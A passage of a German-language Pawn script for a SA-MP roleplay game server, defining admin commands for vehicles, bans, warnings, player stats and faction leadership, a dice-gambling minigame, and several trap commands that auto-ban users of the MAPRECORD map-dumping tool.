    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug!");
    new Float:angle2;
   	GetVehicleZAngle(GetPlayerVehicleID(playerid),angle2);
	SetVehicleZAngle(GetPlayerVehicleID(playerid),angle2);
    return 1;
}
cmd:desveh(playerid,params[])
{
    printf("%s desveh",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
	new veh;
    if(sscanf(params,"d", veh)) return SendClientMessage(playerid,COLOR_RED,"Benutze /desveh [Vehicleid]");
	DestroyVehicle(veh);
    return 1;
}
cmd:respawncars(playerid,params[])
{
	if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
	new string[64], bool:besetzt[MAX_VEHICLES];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerInAnyVehicle(i))
		{
			besetzt[GetPlayerVehicleID(i)]=true;
		}
  		for(new v = 0; v < MAX_VEHICLES; v++)
	  	{
		  	if(besetzt[v] == false)
		  	{
		  	    if(v == SAuto[i][0][sID])
		  	    {
   					SetVehicleToRespawn(SAuto[i][0][sID]);
   					Tuningladen(i,0);
				}
    			if(v == SAuto[i][1][sID])
		  	    {
   					SetVehicleToRespawn(SAuto[i][1][sID]);
   					Tuningladen(i,1);
				}
		  	}
	  	}
  	}
	format(string, sizeof(string),"Admin %s hat alle unbenutzten Privatfahrzeuge respawnt",PlayerName(playerid));
	return SendClientMessageToAll(COLOR_GREEN,string);
}
cmd:ahausrespawn(playerid,params[])
{
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    for(new v = 0; v < MAX_VEHICLES; v++)
    {
        for(new h = 0; h < MAX_AAUTOS; h++)
        {
        	if(v == AutoInfo[h][iCreate])
        	{
        	    SetVehicleToRespawn(AutoInfo[h][iCreate]);
        	}
		}
    }
	return 1;
}
cmd:jobrespawn(playerid,params[])
{
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
	new bool:benutzt[MAX_VEHICLES];
	ForAllPlayers(i){
		if(IsPlayerInAnyVehicle(i)){
			benutzt[GetPlayerVehicleID(i)] = true;
	}}
	for(new x = 0; x < sizeof(ReinigungsFahrzeug); x++){
		if(!benutzt[ReinigungsFahrzeug[x]]){
			RepairVehicle(ReinigungsFahrzeug[x]); Benzin[ReinigungsFahrzeug[x]] = AutoDaten[GetVehicleModel(ReinigungsFahrzeug[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Reinigungsfahrzeuge wurden repariert und aufgetankt!");
	for(new x = 0; x < sizeof(holzi); x++){
		if(!benutzt[holzi[x]]){
			RepairVehicle(holzi[x]); Benzin[holzi[x]] = AutoDaten[GetVehicleModel(holzi[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Holzfällerfahrzeuge wurden repariert und aufgetankt!");

	for(new x = 0; x < sizeof(Taxi); x++){
		if(!benutzt[Taxi[x]]){
			RepairVehicle(Taxi[x]); Benzin[Taxi[x]] = AutoDaten[GetVehicleModel(Taxi[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Taxifahrzeuge wurden repariert und aufgetankt!");

	for(new x = 0; x < sizeof(Bus); x++){
		if(!benutzt[Bus[x]]){
			RepairVehicle(Bus[x]); Benzin[Bus[x]] = AutoDaten[GetVehicleModel(Bus[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Busfahrzeuge wurden repariert und aufgetankt!");

	for(new x = 0; x < sizeof(Trucker); x++){
		if(!benutzt[Trucker[x]]){
			RepairVehicle(Trucker[x]); Benzin[Trucker[x]] = AutoDaten[GetVehicleModel(Trucker[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Trucker wurden repariert und aufgetankt!");

	for(new x = 0; x < sizeof(FarmerFahrzeug); x++){
		if(!benutzt[FarmerFahrzeug[x]]){
			RepairVehicle(FarmerFahrzeug[x]); Benzin[FarmerFahrzeug[x]] = AutoDaten[GetVehicleModel(FarmerFahrzeug[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle FarmerFahrzeuge wurden repariert und aufgetankt!");
	for(new x = 0; x < sizeof(Fahrschullkw); x++){
		if(!benutzt[Fahrschullkw[x]]){
			RepairVehicle(Fahrschullkw[x]); Benzin[Fahrschullkw[x]] = AutoDaten[GetVehicleModel(Fahrschullkw[x])-399][MaxBenzin];}}
	for(new x = 0; x < sizeof(Fahrschulmoto); x++){
		if(!benutzt[Fahrschulmoto[x]]){
			RepairVehicle(Fahrschulmoto[x]); Benzin[Fahrschulmoto[x]] = AutoDaten[GetVehicleModel(Fahrschulmoto[x])-399][MaxBenzin];}}
	for(new x = 0; x < sizeof(Fahrschulautos); x++){
		if(!benutzt[Fahrschulautos[x]]){
			RepairVehicle(Fahrschulautos[x]); Benzin[Fahrschulautos[x]] = AutoDaten[GetVehicleModel(Fahrschulautos[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Fahrschulfahrzeuge wurden repariert und aufgetankt!");
	
	for(new x = 0; x < sizeof(Rollernew); x++){
		if(!benutzt[Rollernew[x]]){
			RepairVehicle(Rollernew[x]); Benzin[Rollernew[x]] = AutoDaten[GetVehicleModel(Rollernew[x])-399][MaxBenzin];}}
	SendClientMessageToAll(COLOR_GREEN,"Alle Roller wurden repariert und aufgetankt!");
 	return 1;
}
cmd:setmats(playerid,params[])
{
    printf("%s setmats",PlayerName(playerid));
    new id;
    new menge;
    if(SpielerInfo[playerid][uAdmin] < 1) return KeineRechte(playerid);
    if(sscanf(params,"dd", id,menge)) return SendClientMessage(playerid,COLOR_RED,"Benutze /setmats [0-6] [MENGE]");
    SendClientMessage(playerid,COLOR_GREEN,"Fraktionsmats gesetzt!");
    LInfo[id][matss] = menge;
	return 1;
}
cmd:frakrespawn(playerid,params[])
{
    printf("%s frakrespawn",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2) return KeineRechte(playerid);
    if(sscanf(params,"d", giveplayerid) || giveplayerid < 1 || giveplayerid > 17) return SendClientMessage(playerid,COLOR_RED,"Benutze /frakrespawn [1-17]");
    for(new i = 0; i < sizeof(FrakFahrzeuge[]); i++)
    {
		if(FrakFahrzeuge[giveplayerid][i][FModell] > 399 && IsVehicleEmpty(i))
		{
		    SetVehicleToRespawn(FrakFahrzeuge[giveplayerid][i][FID]);
			SetVehiclePos(FrakFahrzeuge[giveplayerid][i][FID],FrakFahrzeuge[giveplayerid][i][FX],FrakFahrzeuge[giveplayerid][i][FY],FrakFahrzeuge[giveplayerid][i][FZ]);
			SetVehicleZAngle(FrakFahrzeuge[giveplayerid][i][FID],FrakFahrzeuge[giveplayerid][i][FRZ]);
		}
    }
    SendClientMessage(playerid,COLOR_GREEN,"Fraktionsautos respawnt!");
	return 1;
}

cmd:clearad(playerid,params[])
{
    printf("%s clearad",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] > 0)
    {
        SendClientMessage(playerid,COLOR_GREEN,"Du hast die Werbetafel zurückgesetzt!");
        SetDynamicObjectMaterialText(Werbeschild1,0, "Hier koennte Ihre Werbung stehen!", 120, "Gabriola", 85, 0, 0xFFFFFFFF, 0xFF0E316D, 1);
	}
	else
	{
	    KeineRechte(playerid);
	}
    return 1;
}
cmd:cpc(playerid,params[])
{
    printf("%s cpc",PlayerName(playerid));
    new runden;
    new Grund[285];
    if(SpielerInfo[playerid][uAdmin] > 0)
    {
	    if(sscanf(params,"ris", giveplayerid, runden,Grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /cpc [Name/ID] [Rundenzahl] [Grund]");
		SpielerInfo[giveplayerid][uStrafe] = runden;
		new string[700];
		format(string,sizeof string,"%s zu %d Runden Admin Prison verdonnert. Grund: %s",PlayerName(playerid),runden,Grund);
		SendClientMessage(giveplayerid,COLOR_LIGHTRED,string);
		format(string,sizeof string,"Du hast %s zu %d Runden Admin Prison verdonnert. Grund: %s",PlayerName(giveplayerid),runden,Grund);
		SendClientMessage(playerid,COLOR_LIGHTRED,string);
		DisablePlayerCheckpoint(giveplayerid);
		SpielerInfo[giveplayerid][uStrafCP] = 0;
		SetPlayerCheckpoint(giveplayerid,8944.1328,-9593.5938,2.3312,2);
		Teleport(giveplayerid,8969.2412,-9572.3955,2.3988);
		panelfiles(giveplayerid, playerid, 3,Grund);
	}
	else
	{
	    KeineRechte(playerid);
	}
    return 1;
}
cmd:atanken(playerid,params[])
{
    printf("%s atanken",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 3 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
	new veh = GetPlayerVehicleID(playerid);
	Benzin[veh] = AutoDaten[GetVehicleModel(veh)-399][MaxBenzin];
	return 1;
}

cmd:setarmor(playerid,params[])
{
    new Float:leben;
	printf("%s setarmor",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"rf", giveplayerid,leben)) return SendClientMessage(playerid,COLOR_RED,"Benutze /setarmor [Name/ID][RÜSTUNG]");
    GebeRuestung(giveplayerid,leben);
    return 1;
}
cmd:sethunger(playerid,params[])
{
    new leben;
	printf("%s setleben",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"rd", giveplayerid,leben)) return SendClientMessage(playerid,COLOR_RED,"Benutze /sethunger [Name/ID][HUNGER]");
    SpielerInfo[giveplayerid][uHunger] = leben;
    return 1;
}
cmd:setleben(playerid,params[])
{
    new Float:leben;
	printf("%s setleben",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 2 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"rf", giveplayerid,leben)) return SendClientMessage(playerid,COLOR_RED,"Benutze /setleben [Name/ID][LEBEN]");
    GebeLeben(giveplayerid,leben);
    return 1;
}
cmd:sa(playerid,params[])
{
    new string[128];
	printf("%s sa",PlayerName(playerid));
    new Grund[100];
    if(SpielerInfo[playerid][uAdmin] < 1 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"rs", giveplayerid,Grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /sa [Name/ID][TEXT]");
	format(string,sizeof string,"Admin Nachricht von %s Text: %s",PlayerName(playerid),Grund);
	SendClientMessage(giveplayerid,COLOR_YELLOW,string);
	format(string,sizeof string,"Du hast %s eine Nachricht gesendet!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_YELLOW,string);
    return 1;
}

cmd:kick(playerid,params[])
{
    new string[128];
	printf("%s kick",PlayerName(playerid));
    new Grund[40];
    if(SpielerInfo[playerid][uAdmin] < 1 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"rs", giveplayerid,Grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /kick [Name/ID][Grund]");
    if(SpielerInfo[playerid][uAdmin] >= SpielerInfo[giveplayerid][uAdmin])
    {
		format(string,sizeof (string),"%s hat dich gekickt. Grund: %s",PlayerName(playerid),Grund);
		SendClientMessage(giveplayerid,COLOR_LIGHTRED,string);
		format(string,sizeof (string),"%s wurde von %s vom Server gekickt. Grund: %s",PlayerName(giveplayerid),PlayerName(playerid),Grund);
		SendClientMessageToAll(COLOR_LIGHTBLUE,string);
		SetTimerEx("KICKHIM", 300, false, "d", giveplayerid);
	}else{SendClientMessage(playerid,COLOR_RED,"Du kannst keinen Supporter / Administrator kicken!");}
    return 1;
}
cmd:mrhelp(playerid,params[])
{
    new string[265];
    printf("%s mrhelp",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	SpielerInfo[playerid][uBan] = 1;
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:mrstart(playerid,params[])
{
    new string[265];
    printf("%s mrstart",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	SpielerInfo[playerid][uBan] = 1;
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:mrstop(playerid,params[])
{
    new string[265];
    printf("%s mrstop",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	SpielerInfo[playerid][uBan] = 1;
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:mrreset(playerid,params[])
{
    new string[265];
    printf("%s mrreset",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	SpielerInfo[playerid][uBan] = 1;
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:mrsave(playerid,params[])
{
    new string[265];
    printf("%s mrsave",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	SpielerInfo[playerid][uBan] = 1;
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:maprecord(playerid,params[])
{
    new string[265];
    printf("%s maprecord",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SpielerInfo[playerid][uBan] = 1;
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:mapinfo(playerid,params[])
{
	new string[265];
    printf("%s mapinfo",PlayerName(playerid));
	SendClientMessage(playerid,COLOR_LIGHTRED,"[SYSTEM]: Du wurdest gebannt! Grund: MAPRECORD");
	format(string,sizeof string,"[SYSTEM]: %s wurde vom Server gebannt! Grund: MAPRECORD",PlayerName(playerid));
	SendClientMessageToAll(COLOR_LIGHTRED,string);
	KWBLog(PlayerName(playerid),"SYSTEM","Bann","MAPRECORD");
	SpielerInfo[playerid][uBan] = 1;
	SetTimerEx("BANHIM", 300, false, "d", playerid);
	panelfiles(playerid, -1, 2,"Maprecord");
	return 1;
}
cmd:ban(playerid,params[])
{
	printf("%s ban",PlayerName(playerid));
    new Grund[40];
    if(SpielerInfo[playerid][uAdmin] < 2 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"rs", giveplayerid,Grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /ban [Name/ID][Grund]");
    if(SpielerInfo[giveplayerid][uAdmin] < 1)
    {
		BanPlayer(giveplayerid, playerid, Grund);
		panelfiles(giveplayerid, playerid, 2,Grund);
	}else{SendClientMessage(playerid,COLOR_RED,"Du kannst keinen Supporter / Administrator bannen!");}
    return 1;
}
forward BANHIM(pid);
public BANHIM(pid)
{
	Ban(pid);
	return 1;
}

stock BanPlayer(playerid, adminid, reason[])
{
	new string[128];
    format(string,sizeof string,"%s hat dich gebannt. Grund: %s",PlayerName(adminid),reason);
	SendClientMessage(playerid,COLOR_LIGHTRED,string);
	format(string,sizeof string,"%s wurde von %s vom Server gebannt. Grund: %s",PlayerName(playerid),PlayerName(adminid),reason);
	SendClientMessageToAll(COLOR_LIGHTBLUE,string);
	KWBLog(PlayerName(playerid),PlayerName(adminid),"Bann",reason);
	SpielerInfo[playerid][uBan] = 1;
	SetTimerEx("BANHIM", 300, false, "d", playerid);

	return 1;
}


cmd:tv(playerid,params[])
{
	printf("%s tv",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 1 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /tv [Name/ID]");
    if(Spectate[playerid] == -1)
    {
        GetPlayerPos(playerid,SpielerInfo[playerid][uPosX],SpielerInfo[playerid][uPosY],SpielerInfo[playerid][uPosZ]);
		TogglePlayerSpectating(playerid, 1);
    	PlayerSpectatePlayer(playerid, giveplayerid);
    	Spectate[playerid] = giveplayerid;
	}
	else
	{
	    Spectate[playerid] = -1;
	    TogglePlayerSpectating(playerid, 0);
	}
    return 1;
}
cmd:zeitsetzen(playerid,params[])
{
    printf("%s zeitsetzen",PlayerName(playerid));
    new level;
    if(IstSpielerInFrak(playerid,1) || IstSpielerInFrak(playerid,2) || IstSpielerInFrak(playerid,15))
    {
	    if(sscanf(params,"ri", giveplayerid, level)) return SendClientMessage(playerid,COLOR_RED,"Benutze /zeitsetzen [Name/ID] [Zeit]");
		SpielerInfo[giveplayerid][uKnastZeit] = level;
		new string[100];
		format(string,sizeof string,"%s hat deine Knastzeit auf %d geändert!",PlayerName(playerid),level);
		SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
		format(string,sizeof string,"Du hast %s seine Knastzeit auf %d geändert!",PlayerName(giveplayerid),level);
		SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	}
	else
	{
		SendClientMessage(playerid,COLOR_RED,"Du bist kein Cop!");
	}
    return 1;
}
cmd:gebelevel(playerid,params[])
{
    printf("%s gebelevel",PlayerName(playerid));
    new level;
    if(SpielerInfo[playerid][uAdmin] < 5 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"ri", giveplayerid, level)) return SendClientMessage(playerid,COLOR_RED,"Benutze /gebelevel [Name/ID] [LEVEL]");
	SpielerInfo[giveplayerid][uLevel] = level;
	SetPlayerScore(giveplayerid,level);
	new string[100];
	format(string,sizeof string,"%s hat dich zu einem Level %d gemacht.",PlayerName(playerid),level);
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du hast %s zu einem Level %d gemacht.",PlayerName(giveplayerid),level);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
    return 1;
}
cmd:wuerfeln(playerid,params[])
{
	new Float:geld,str[130];
	if(kannwuerfel == 1) return SendClientMessage(playerid,COLOR_RED,"Es Würfelt bereits jemand!");
    if(sscanf(params,"rf", giveplayerid, geld)) return SendClientMessage(playerid,COLOR_RED,"Benutze /wuerfeln [Name/ID] [GELD]");
	if(!IsPlayerInRangeOfPoint(playerid,6,3722.8711, -9324.9697, 3.9576)) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht am Würfeltisch!");
	if(!IsPlayerInRangeOfPoint(giveplayerid,6,3722.8711, -9324.9697, 3.9576)) return SendClientMessage(playerid,COLOR_RED,"Der andere Spieler ist nicht am Würfeltisch!");
	if(geld < 0.01) return SendClientMessage(playerid,COLOR_RED,"Du musst mindestens um 0.01 würfeln!");
	if(geld > SpielerInfo[playerid][uGeld]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht soviel Geld!");
	if(geld > SpielerInfo[giveplayerid][uGeld]) return SendClientMessage(playerid,COLOR_RED,"Der andere Spieler hat nicht soviel Geld!");
	kannwuerfel = 1;
	wuerfelgeld = geld;
    spielerw1 = playerid;
    spielerw2 = giveplayerid;
	SendClientMessage(playerid,COLOR_GREEN,"Angebot abgesendet!");
	format(str,sizeof(str),"%s bietet dir eine Runde Würfeln an. Gespielt wird um %.2f$",PlayerName(playerid),geld);
	ShowPlayerDialog(giveplayerid,DIALOG_WUERFEL,DIALOG_STYLE_MSGBOX,"Würfeln",str,"Annehmen","Ablehnen");
	return 1;
}
forward Timerwu();
public Timerwu()
{
	new string[128];
	new rand1 = random(6);//spielerw1
	new rand2 = random(6);//spielerw2
	if(rand1 == rand2)
	{
		format(string, sizeof(string), "Es ging unentschieden aus, Gefallene Zahlen: %d",rand1);
		SendRadiusMessage(spielerw1,20.0,string,COLOR_ORANGE);
		GebeGeld(spielerw1,wuerfelgeld/2);
		GebeGeld(spielerw2,wuerfelgeld/2);
	}
	else if(rand1 > rand2)
	{
	    format(string, sizeof(string), "%s gewann mit der Zahl %d. %s Würfelte die Zahl %d. Gewinn: %.2f$",PlayerName(spielerw1),rand1,PlayerName(spielerw2),rand2,wuerfelgeld);
		SendRadiusMessage(spielerw1,20.0,string,COLOR_ORANGE);
		GebeGeld(spielerw1,wuerfelgeld);
	}
	else if(rand2 > rand1)
	{
 		format(string, sizeof(string), "%s gewann mit der Zahl %d. %s Würfelte die Zahl %d. Gewinn: %.2f$",PlayerName(spielerw2),rand2,PlayerName(spielerw1),rand1,wuerfelgeld);
		SendRadiusMessage(spielerw2,20.0,string,COLOR_ORANGE);
		GebeGeld(spielerw2,wuerfelgeld);
	}
	SendRadiusMessage(spielerw2,20.0,"Es Kann neu gewürfelt werden....",COLOR_GREEN);
	kannwuerfel = 0;
	wuerfelgeld = 0.0;
    spielerw1 = -1;
    spielerw2 = -1;
	return 1;
}
cmd:macheadmin(playerid,params[])
{
    printf("%s macheadmin",PlayerName(playerid));
    new level;
    if(SpielerInfo[playerid][uAdmin] < 5 && !IsPlayerAdmin(playerid)) return KeineRechte(playerid);
    if(sscanf(params,"ri", giveplayerid, level)) return SendClientMessage(playerid,COLOR_RED,"Benutze /macheamdin [Name/ID] [0-5]");
	SpielerInfo[giveplayerid][uAdmin] = level;
	new string[100];
	format(string,sizeof string,"%s hat dich zu einem Level %d Admin gemacht.",PlayerName(playerid),level);
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du hast %s zu einem Level %d Admin gemacht.",PlayerName(giveplayerid),level);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
    return 1;
}
cmd:warn(playerid,params[])
{
	new grund[40];
    printf("%s warn",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
	if(sscanf(params,"rs", giveplayerid,grund)) return SendClientMessage(playerid,COLOR_RED,"Benutze /warn [Name/ID][Grund]");
	new string[128];
	SpielerInfo[giveplayerid][uWarns]++;
	format(string,sizeof string,"%s hat dir einen Warn gegeben. Grund: %s",PlayerName(playerid),grund);
	SendClientMessage(giveplayerid,COLOR_GREEN,string);
	format(string,sizeof string,"Du hast %s einen Warn gegeben. Grund: %s",PlayerName(giveplayerid),grund);
	SendClientMessage(playerid,COLOR_GREEN,string);
	panelfiles(giveplayerid, playerid, 1,grund);
    if(SpielerInfo[giveplayerid][uWarns] == 3)
    {
        SendClientMessage(giveplayerid,COLOR_RED,"Du wurdest gebannt, Grund: 3 Verwarnungen!");
        format(string,sizeof string,"%s wurde gebannt, Grund: 3 Verwarnungen",PlayerName(giveplayerid));
    	SendMessageToAll(giveplayerid,string);
    	KWBLog(PlayerName(giveplayerid),"System","Bann","3 Verwarnungen");
    	SpielerInfo[playerid][uBan] = 1;
    	Ban(giveplayerid);
    	panelfiles(giveplayerid, playerid, 2,grund);
    }
	return 1;
}
cmd:unwarn(playerid,params[])
{
    printf("%s unwarn",PlayerName(playerid));
    if(SpielerInfo[playerid][uAdmin] < 3) return KeineRechte(playerid);
	if(sscanf(params,"r", giveplayerid)) return SendClientMessage(playerid,COLOR_RED,"Benutze /unwarn [Name/ID]");
	if(SpielerInfo[giveplayerid][uWarns] == 0) return SendClientMessage(playerid,COLOR_RED,"Der User hat keine Verwarnung!");
	new string[70];
	SpielerInfo[giveplayerid][uWarns]--;
	format(string,sizeof string,"%s hat deine Verwarnung entfernt!",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_GREEN,string);
	format(string,sizeof string,"Du hast %s die Verwarnung entfernt!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_GREEN,string);
	return 1;
}
cmd:extrazeit(playerid,params[])
{
	new newtime;
    printf("%s extrazeit",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2))return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist!");
    if(sscanf(params,"rd", giveplayerid, newtime)) return SendClientMessage(playerid,COLOR_RED,"Benutze /extrazeit [Name/ID] [Extrazeit]");
    if(EntfernungZwischenSpielern(playerid,giveplayerid) > 6) return SendClientMessage(playerid,COLOR_RED,"Der Spieler ist zu weit entfernt!");
    SpielerInfo[giveplayerid][uKnastZeit] += newtime*60;
    SendFormatMessage(playerid,COLOR_GREEN,"Du hast die Knastzeit von %s um %i Minuten verlängert.",PlayerName(giveplayerid),newtime);
    SendFormatMessage(playerid,COLOR_GREEN,"%s sitzt nun %i Minuten im Gefängnis.",PlayerName(giveplayerid),SpielerInfo[giveplayerid][uKnastZeit]/60);
    SendFormatMessage(giveplayerid,COLOR_GREEN,"Officer %s hat deine Knastzeit um %i Minuten verlängert.",PlayerName(playerid),newtime);
    SendFormatMessage(giveplayerid,COLOR_GREEN,"Du sitzt nun %i Minuten im Gefängnis.",SpielerInfo[giveplayerid][uKnastZeit]/60);
	return 1;
}
cmd:macheleiter(playerid,params[])
{
    printf("%s macheleiter",PlayerName(playerid));
    new level;
    if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
    if(sscanf(params,"ri", giveplayerid, level)) return SendClientMessage(playerid,COLOR_RED,"Benutze /macheleiter [Name/ID] [Fraktion]");
    //if(SpielerInfo[giveplayerid][uLeiter] != 0) WBB_RemoveUserFromGroup(PlayerName(giveplayerid),ForumGruppen[SpielerInfo[giveplayerid][uLeiter]-1][0]);
	//else if(SpielerInfo[giveplayerid][uMitglied] != 0) WBB_RemoveUserFromGroup(PlayerName(giveplayerid),ForumGruppen[SpielerInfo[giveplayerid][uMitglied]-1][1]);
	SpielerInfo[giveplayerid][uLeiter] = level;
	if(level == 0)
	{
	    SpielerInfo[giveplayerid][uSpawn] = 1;
	    SendClientMessage(giveplayerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Lake Sorten Motel! Ändere dein Spawnort mit /spawns");
	}
	else
	{
	    SpielerInfo[giveplayerid][uSpawn] = 4;
	    SendClientMessage(giveplayerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Fraktionsbase! Ändere dein Spawnort mit /spawns");
	}
	SpielerInfo[giveplayerid][uMitglied] = 0;
	SpielerInfo[giveplayerid][uRang] = 8;
	if(level == 1 || level == 2) SpielerInfo[giveplayerid][uRang] = 8;
	new string[100];
	format(string,sizeof string,"%s hat dich zum Leader der %s gemacht.",PlayerName(playerid),Fraktionen[level]);
	SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
	format(string,sizeof string,"Du hast %s zum Leader der %s gemacht.",PlayerName(giveplayerid),Fraktionen[level]);
	SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
	//WBB_SetUserToGroup(PlayerName(giveplayerid),ForumGruppen[level-1][0]);
	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
	new string2[10];
	format(string2,10,"%d",SpielerInfo[giveplayerid][uLeiter]);
	mysqlupdate("user",string,"Leiter",string2);
	
	format(string2,10,"%d",SpielerInfo[giveplayerid][uRang]);
	mysqlupdate("user",string,"Rang",string2);
	

	
	SpielerInfo[giveplayerid][uArbeitslosengeld] = 0;
	return 1;
}
cmd:frakverlassen(playerid,params[])
{
	if(SpielerInfo[playerid][uMitglied] > 0 || SpielerInfo[playerid][uLeiter] > 0)
	{
	    new string[100];
	    SpielerInfo[playerid][uLeiter] = 0;
	    SpielerInfo[playerid][uRang] = 0;
	    SpielerInfo[playerid][uMitglied] = 0;
	    SendClientMessage(playerid,COLOR_GREEN,"Du hast nun deine Fraktion verlassen!");
    	format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
		new string2[4];
		format(string2,4,"%d",SpielerInfo[playerid][uLeiter]);
		mysqlupdate("user",string,"Leiter",string2);
		format(string,sizeof string,"userID='%d'",SpielerInfo[giveplayerid][uID]);
		new string3[4];
		format(string3,4,"%d",SpielerInfo[playerid][uMitglied]);
		mysqlupdate("user",string,"Mitglied",string3);
  		SpielerInfo[playerid][uSpawn] = 1;
